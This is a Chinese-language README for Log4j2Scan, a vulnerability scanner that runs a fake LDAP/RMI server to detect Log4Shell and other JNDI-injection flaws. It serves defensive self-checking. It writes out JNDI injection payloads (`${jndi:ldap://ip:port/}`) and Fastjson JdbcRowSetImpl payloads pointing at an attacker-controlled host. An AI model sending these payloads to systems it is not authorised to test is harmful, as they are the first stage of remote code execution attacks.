# Log4j2Scan

![](https://img.shields.io/badge/build-passing-brightgreen)
![](https://img.shields.io/badge/golang-1.17-blue)

## 介绍
 
这是什么？

该项目一款无须借助`dnslog`且完全无害的log4j2反连检测工具，解析`RMI`和`LDAP`协议实现，可用于甲方内网自查

特点：
- 由`Golang`编写，直接运行可执行文件进行检测
- 动态渲染数据到`web`页面，方便观察结果

![](https://github.com/KpLi0rn/Log4j2Scan/blob/main/img/001.png)

## 使用

使用`${jndi:ldap://ip:端口/}`这样的`Payload`

如果目标存在漏洞，该项目就会收到`ldap/rmi`请求，从而快速定位哪些目标存在漏洞

Demo
![](https://github.com/KpLi0rn/Log4j2Scan/blob/main/img/002.png)

根据自己操作系统下载对应的可执行文件：[下载地址](https://github.com/KpLi0rn/Log4j2Scan/releases/tag/v0.0.1)

命令：`./Log4j2Scan -p port(默认8001) -wp webport(默认8888)`

```text
    __                __ __  _ _____
   / /   ____  ____ _/ // / (_) ___/_________ _____
  / /   / __ \/ __ `/ // /_/ /\__ \/ ___/ __ `/ __ \
 / /___/ /_/ / /_/ /__  __/ /___/ / /__/ /_/ / / / /
/_____/\____/\__, /  /_/_/ //____/\___/\__,_/_/ /_/
 /____/    /___/
    coded by 天下大木头 & 4ra1n
[+] [16:36:26] use port: 8000
[+] [16:36:26] use http port: 8888
[+] [16:36:26] start fake reverse server
[+] [16:36:26] start result http server
|------------------------------------|
|--Payload: ldap/rmi://your-ip:port--|
|------------------------------------|
```

只需要将`Payload`设置为：`ldap://your-ip:port`或`rmi://your-ip:port/xxx`

然后访问：`localhost:8888`即可动态查看最新结果

注意：`rmi`方式一定要加入`xxx`

## 拓展

不止用于`Log4j2`框架，也可用于检测存在`JNDI`注入的其他框架

例如`Fastjson`的检测：

```text
{
	"@type": "com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName": "rmi://your-ip:port",
	"autoCommit": true
}

{
	"@type": "com.sun.rowset.JdbcRowSetImpl",
	"dataSourceName": "ldap://your-ip:port",
	"autoCommit": true
}
```
